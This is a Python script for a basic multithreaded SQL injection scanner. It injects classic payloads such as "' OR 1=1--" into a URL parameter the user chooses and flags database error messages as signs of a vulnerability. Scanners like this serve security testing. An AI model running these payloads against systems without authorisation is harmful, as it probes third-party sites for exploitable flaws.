import requests
import threading
import queue
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# -----------------------------------
# SQL PAYLOADS & ERROR PATTERNS
# -----------------------------------
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' UNION SELECT null--"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch"
]

# -----------------------------------
# CONFIG
# -----------------------------------
THREADS = 4
RATE_LIMIT = 3  # seconds

logging.basicConfig(
    filename="sqli_custom_scan.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

task_queue = queue.Queue()

# -----------------------------------
# URL PAYLOAD INJECTION
# -----------------------------------
def build_url(original_url, param, payload):
    parsed = urlparse(original_url)
    params = parse_qs(parsed.query)

    if param not in params:
        return None

    params[param] = payload
    new_query = urlencode(params, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

# -----------------------------------
# SCAN FUNCTION
# -----------------------------------
def scan(target_url, parameter, payload):
    try:
        test_url = build_url(target_url, parameter, payload)
        if not test_url:
            print(f"[!] Parameter '{parameter}' not found in URL")
            return

        response = requests.get(test_url, timeout=5)

        for error in SQL_ERRORS:
            if error.lower() in response.text.lower():
                print(f"[+] SQL Injection FOUND using payload: {payload}")
                logging.warning(f"VULNERABLE | Payload: {payload} | URL: {test_url}")
                return

        print(f"[-] Safe payload tested: {payload}")
        logging.info(f"SAFE | Payload: {payload}")

    except Exception as e:
        logging.error(f"ERROR | Payload: {payload} | {e}")

    time.sleep(RATE_LIMIT)

# -----------------------------------
# WORKER THREAD
# -----------------------------------
def worker(target_url, parameter):
    while not task_queue.empty():
        payload = task_queue.get()
        scan(target_url, parameter, payload)
        task_queue.task_done()

# -----------------------------------
# MAIN FUNCTION
# -----------------------------------
def main():
    print("\n=== SQL Injection Scanner (Educational) ===")
    target_url = input("Enter target URL: ").strip()
    parameter = input("Enter parameter to test (e.g., id): ").strip()

    for payload in SQL_PAYLOADS:
        task_queue.put(payload)

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(target_url, parameter))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\nScan completed. Results saved in sqli_custom_scan.log")

if __name__ == "__main__":
    main()
